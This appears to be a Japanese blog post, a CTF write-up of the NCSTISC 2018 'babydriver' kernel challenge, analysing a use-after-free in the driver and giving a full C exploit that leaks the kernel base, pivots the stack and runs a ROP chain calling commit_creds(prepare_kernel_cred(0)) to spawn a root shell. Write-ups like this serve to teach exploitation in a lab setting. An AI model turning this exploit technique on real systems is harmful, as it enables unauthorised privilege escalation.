@@ -1,0 +1,395 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>super-easy /  baby /  heap /  UAF /  slub /  kernel exploit
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p></p>
+<h3>1: イントロ</h3>
+<p>kernel強化月間なのでいい感じの問題集を探していたところ<a href="https://hama.hatenadiary.jp/entry/2018/12/03/000000">hamaさんのブログ</a>によさげなのがあったため解いていく。第1問目は <strong>NCSTISC CTF 2018</strong> の <strong>babydriver</strong> 。</p>
+<p>ブログよく見てみたら<a href="https://hama.hatenadiary.jp/entry/2019/12/01/231213">hamaリストには2019年版</a>もありました。解いていきたいですね</p>
+<p></p>
+<h3>2: static analysis</h3>
+<h4>basics</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">static.sh</div>
+<pre class="prettyprint linenums lang-sh">
+$ modinfo ./babydriver.ko
+filename:       /home/wataru/Documents/ctf/ncstisc2018/babydriver/work/./babydriver.ko
+description:    Driver module for begineer
+license:        GPL
+srcversion:     BF97BBB242B36676F9A574E
+depends:
+vermagic:       4.4.72 SMP mod_unload modversions
+
+/ $ cat /proc/version
+Linux version 4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP T7
+
+  -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \
+  -smp cores=1,threads=1 \
+  -cpu kvm64,+smep \
+</pre>
+<p>SMEP有効・SMAP無効・oops-&gt;panic・KASLR有効</p>
+<p></p>
+<h4>cdev</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">cdev.sh</div>
+<pre class="prettyprint linenums lang-sh">
+(gdb) p *(struct cdev*)0xffffffffc0002460
+$1 = {
+  kobj = {
+    name = 0x0,
+    entry = {
+      next = 0xffffffffc0002468,
+      prev = 0xffffffffc0002468
+    },
+    parent = 0x0,
+    kset = 0x0,
+    ktype = 0xffffffff81e779c0,
+    sd = 0x0,
+    kref = {
+      refcount = {
+        refs = {
+          counter = 1
+        }
+      }
+    },
+    state_initialized = 1,
+    state_in_sysfs = 0,
+    state_add_uevent_sent = 0,
+    state_remove_uevent_sent = 0,
+    uevent_suppress = 0
+  },
+  owner = 0xffffffffc0002100,
+  ops = 0xffffffffc0002000,
+  list = {
+    next = 0xffffffffc00024b0,
+    prev = 0xffffffffc00024b0
+  },
+  dev = 260046848,
+  count = 1
+}
+(gdb) p *((struct cdev*)0xffffffffc0002460).ops
+$3 = {
+  owner = 0xffffffffc0002100,
+  llseek = 0x0,
+  read = 0xffffffffc0000130,
+  write = 0xffffffffc00000f0,
+  read_iter = 0x0,
+  write_iter = 0x0,
+  iopoll = 0x0,
+  iterate = 0x0,
+  iterate_shared = 0xffffffffc0000080,
+  poll = 0x0,
+  unlocked_ioctl = 0x0,
+  compat_ioctl = 0xffffffffc0000030,
+  mmap = 0x0,
+  mmap_supported_flags = 18446744072635809792,
+  (snipped...)
+↑ 結構オフセット違うからダメだわ
+}
+</pre>
+<p>実装されている <em>fops</em> は、 <em>open/read/write/ioctl</em> の4つ。</p>
+<p></p>
+<h4>fops</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">fops.c</div>
+<pre class="prettyprint linenums lang-c">
+open:
+    babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc-64)
+    babydev_struct.buf_len = 0x40
+write:
+    if babydev_struct.device_buf is not NULL and arg_size &lt; babydev_struct.buf_len then
+        _copy_from_user(baby_dev_struct.device_buf, arg_size)
+read:
+        if babydev_struct.device_buf is not NULL and arg_size &lt; babydev_struct.buf_len then
+        _copy_to_user(baby_dev_struct.device_buf, arg_size)
+ioctl:
+    if cmd == 0x10001 then
+        kfree(babydev_struct.device_buf)
+        babydev_struct.device_buf = kmem_cache_alloc_trace(size)
+        babydev_struct.buf_len = 0x40
+</pre>
+<p> <em>ioctl</em> で任意の大きさに <em>buf</em> を取り直せる。</p>
+<p></p>
+<h3>3: vuln</h3>
+<p><code>babyrelease()</code>時に<code>babydev_struct.device_buf</code>を<code>kfree()</code>するのだが、参照カウンタ等による制御を行っていない。そのため複数<code>open()</code>しておいてどれか一つで<code>close()</code>すると簡単に <strong>UAF</strong> が実現できる。しかも、freeされているオブジェクトを再allocするまでもなく保有できる。</p>
+<p>え、もうこの時点で解けたことにしていいかな。。。いや、何か新しい気付きがあるかも知れないから一応やってみよ。</p>
+<p></p>
+<h3>4: kernbase leak</h3>
+<p> <em>/proc/self/stat</em> を<code>read()</code>して<code>seq_operations</code>から<code>leak</code>。それだけ。</p>
+<p></p>
+<h3>5: get RIP</h3>
+<p>さっき使った<code>seq_operations</code>を使いまわしてそのままRIPを取れる。SMEP有効だからROP chainして終わり。まじで、ROP chainのgadget調べる時間のほうがこの問題解くよりも1.5倍くらい多い気がする。</p>
+<p></p>
+<h3>6: exploit</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+
+
+// commands
+#define DEV_PATH &quot;/dev/babydev&quot;   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+// (END globals)
+
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
+ulong user_cs,user_ss,user_sp,user_rflags;
+struct pt_regs {
+	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+	ulong orig_ax; ulong ip; ulong cs; ulong flags;
+  ulong sp; ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  char *argv[] = {&quot;/bin/sh&quot;,NULL};
+  char *envp[] = {NULL};
+  execve(&quot;/bin/sh&quot;,argv,envp);
+}
+// should compile with -masm=intel
+static void save_state(void) {
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
+}
+
+static void shellcode(void){
+  asm(
+    &quot;xor rdi, rdi\n&quot;
+    &quot;mov rbx, QWORD PTR [rsp+0x50]\n&quot;
+    &quot;sub rbx, 0x244566\n&quot;
+    &quot;mov rcx, rbx\n&quot;
+    &quot;call rcx\n&quot;
+    &quot;mov rdi, rax\n&quot;
+    &quot;sub rbx, 0x470\n&quot;
+    &quot;call rbx\n&quot;
+    &quot;add rsp, 0x20\n&quot;
+    &quot;pop rbx\n&quot;
+    &quot;pop r12\n&quot;
+    &quot;pop r13\n&quot;
+    &quot;pop r14\n&quot;
+    &quot;pop r15\n&quot;
+    &quot;pop rbp\n&quot;
+    &quot;ret\n&quot;
+  );
+}
+// (END utils)
+
+/******* babydev ****************/
+#define INF 1&lt;&lt;31
+size_t current_size = INF;
+
+int _open(){
+  int _fd = open(DEV_PATH, O_RDWR);
+  assert(_fd &gt; 0);
+  current_size = 0x40;
+  return _fd;
+}
+
+void _write(int fd, char *buf, size_t size){
+  assert(size &lt; current_size);
+  assert(write(fd, buf, size) &gt;= 0);
+}
+
+void _realloc(int fd, size_t size){
+  assert(ioctl(fd, 0x10001, size) == 0);
+  current_size = size;
+}
+
+void _close(int fd){
+  assert(close(fd) &gt;= 0);
+}
+
+void _read(int fd, char *buf, size_t size){
+  assert(size &lt; current_size);
+  assert(read(fd, buf, size) &gt; 0);
+}
+/******* (END babydev) *************/
+
+/*** gadgets ***/
+/*
+0xffffffff810eefd0: mov esp, 0x5DFFFA88 ; ret  ;  (1 found)
+0xffffffff81018062: mov rdi, rax ; rep movsq  ; pop rbp ; ret  ;  (1 found)
+0xffffffff810a1810 T prepare_kernel_cred
+0xffffffff810a1420 T commit_creds
+0xffffffff8102a4a5: mov rax, rdi ; pop rbp ; ret  ;  (32 found)
+0xffffffff8181a797:       48 cf                   iretq
+0xffffffff8100700c: pop rcx ; ret  ;  (25 found)
+
+0xffffffff81063694:       0f 01 f8                swapgs
+0xffffffff81063697:       5d                      pop    rbp
+0xffffffff81063698:       c3                      ret
+
+*/
+
+void gen_chain(ulong *a, const ulong kernbase)
+{
+  scu pop_rdi =             0x3e7d9d;
+  scu prepare_kernel_cred = 0x0a1810;
+  scu rax2rdi_rep_pop_rbp = 0x018062;
+  scu pop_rcx =             0x00700c;
+  scu commit_creds =        0x0a1420;
+  scu swapgs_pop_rbp =      0x063694;
+  scu iretq =               0x81a797;
+
+  save_state();
+
+  *a++ = pop_rdi + kernbase;
+  *a++ = 0;
+  *a++ = prepare_kernel_cred + kernbase;
+  *a++ = pop_rcx + kernbase;
+  *a++ = 0;
+  *a++ = rax2rdi_rep_pop_rbp + kernbase;
+  *a++ = 0;
+  *a++ = commit_creds + kernbase;
+
+  *a++ = swapgs_pop_rbp + kernbase;
+  *a++ = 0;
+  *a++ = iretq + kernbase;
+  *a++ = &amp;NIRUGIRI;
+  *a++ = user_cs;
+  *a++ = user_rflags;
+  *a++ = user_sp;
+  *a++ = user_ss;
+
+  *a++ = 0xdeadbeef; // unreachable
+}
+
+/************ MAIN ****************/
+
+int main(int argc, char *argv[]) {
+  char buf[0x2000];
+  int fd[0x10];
+  int statfd;
+
+  // UAF
+  fd[0] = _open();
+  fd[1] = _open();
+  _realloc(fd[0], 0x20);
+  _close(fd[0]);
+
+  // leak kernbase
+  statfd = open(&quot;/proc/self/stat&quot;, O_RDONLY);
+  assert(statfd &gt; 0);
+  _read(fd[1], buf, 0x10);
+  const ulong single_start = ((ulong*)buf)[0];
+  const ulong kernbase = single_start - 0x22f4d0UL;
+  printf(&quot;[!] single_start: %lx\n&quot;, single_start);
+  printf(&quot;[!] kernbase: %lx\n&quot;, kernbase);
+
+  // prepare chain and get RIP
+  const ulong gadstack = 0x5DFFFA88;
+  const char *maddr = mmap(gadstack &amp; ~0xFFF, 4*PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+  const ulong **chain = maddr + (gadstack &amp; 0xFFF);
+  gen_chain(chain, kernbase);
+
+  ((ulong*)buf)[0] = kernbase + 0x0eefd0;
+  _write(fd[1], buf, 0x8);
+
+  // NIRUGIRI
+  read(statfd, buf, 1);
+
+  return 0;
+}
+</pre>
+<p></p>
+<h3>7: アウトロ</h3>
+<p>新しい気づきは、ありませんでした。</p>
+<p></p>
+<p>もうすぐ3.11から10年ですね。あの時から精神的にも知能的にも技術的にも何一つ成長できている気がしませんが、小学生の自分には笑われないようにしたいですね。</p>
+<p></p>
+<p>あと柴犬飼いたいですね。</p>
+<p></p>
+<p></p>
+<h3>8: symbols without KASLR</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">symbols.txt</div>
+<pre class="prettyprint linenums lang-txt">
+cdev: 0xffffffffc0002460
+fops: 0xffffffffc0002000
+kmem_cache_alloc_trace: 0xffffffff811ea180
+babyopen: 0xffffffffc0000030
+babyioctl: 0xffffffffc0000080
+babywrite: 0xffffffffc00000f0
+kmalloc-64: 0xffff880002801b00
+kmalloc-64&#x27;s cpu_slub: 0x19e80
+babydev_struct: 0xffffffffc00024d0
+</pre>
+<p></p>
+<h3>9: 参考</h3>
+<p>1: hamaリスト2018</p>
+<p><a href='https://hama.hatenadiary.jp/entry/2018/12/01/000000'>https://hama.hatenadiary.jp/entry/2018/12/01/000000</a></p>
+<p>2: hamaリスト2019</p>
+<p><a href='https://hama.hatenadiary.jp/entry/2019/12/01/231213'>https://hama.hatenadiary.jp/entry/2019/12/01/231213</a></p>
+<p>3: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
